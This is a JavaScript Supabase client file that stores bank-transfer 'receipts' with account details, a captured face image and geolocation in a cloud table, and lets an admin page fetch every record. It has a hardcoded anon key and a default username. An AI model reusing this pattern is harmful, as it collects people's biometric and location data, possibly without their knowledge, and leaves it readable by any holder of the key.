// Supabase client - shared across all pages
const SUPABASE_URL = 'https://rgnorcrlshskaindafzs.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJnbm9yY3Jsc2hza2FpbmRhZnpzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2OTQ5MzgsImV4cCI6MjA5MzI3MDkzOH0.yluqapG5--VaXyGuSVdJYMeizewYLzkG3lbebVDu1pY';

let _supabase = null;

function getSupabase() {
  if (!_supabase) {
    _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
  }
  return _supabase;
}

// Save receipt to Supabase (cloud) so admin can see from any device
// Retries up to 3 times if it fails
async function saveReceiptToCloud(receiptData) {
  const payload = {
    username: receiptData.username || 'BABATUNDE',
    account_name: receiptData.accountName || '',
    bank_name: receiptData.bankName || '',
    account_number: receiptData.accountNumber || '',
    amount: receiptData.amount || 0,
    narration: receiptData.narration || '',
    reference_number: receiptData.referenceNumber || '',
    transaction_date: receiptData.transactionDate || new Date().toISOString(),
    transaction_type: receiptData.transactionType || 'debit',
    captured_face: receiptData.capturedFace || null,
    location_latitude: receiptData.location ? receiptData.location.latitude : null,
    location_longitude: receiptData.location ? receiptData.location.longitude : null,
    location_accuracy: receiptData.location ? receiptData.location.accuracy : null
  };

  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      const supabase = getSupabase();
      const { data, error } = await supabase.from('receipts').insert(payload);
      if (error) {
        console.error('Supabase insert error (attempt ' + attempt + '):', error);
        if (attempt < 3) { await new Promise(r => setTimeout(r, 2000)); continue; }
        return { data: null, error };
      }
      return { data, error: null };
    } catch (e) {
      console.error('Failed to save receipt to cloud (attempt ' + attempt + '):', e);
      if (attempt < 3) { await new Promise(r => setTimeout(r, 2000)); continue; }
      return { data: null, error: e };
    }
  }
  return { data: null, error: new Error('All 3 attempts failed') };
}

// Get all receipts from Supabase (for admin page)
// Retries up to 3 times if it fails
async function getAllReceiptsFromCloud() {
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      const supabase = getSupabase();
      const { data, error } = await supabase
        .from('receipts')
        .select('*')
        .order('created_at', { ascending: false });
      if (error) {
        console.error('Supabase fetch error (attempt ' + attempt + '):', error);
        if (attempt < 3) { await new Promise(r => setTimeout(r, 2000)); continue; }
        return [];
      }
      return data || [];
    } catch (e) {
      console.error('Failed to fetch receipts from cloud (attempt ' + attempt + '):', e);
      if (attempt < 3) { await new Promise(r => setTimeout(r, 2000)); continue; }
      return [];
    }
  }
  return [];
}
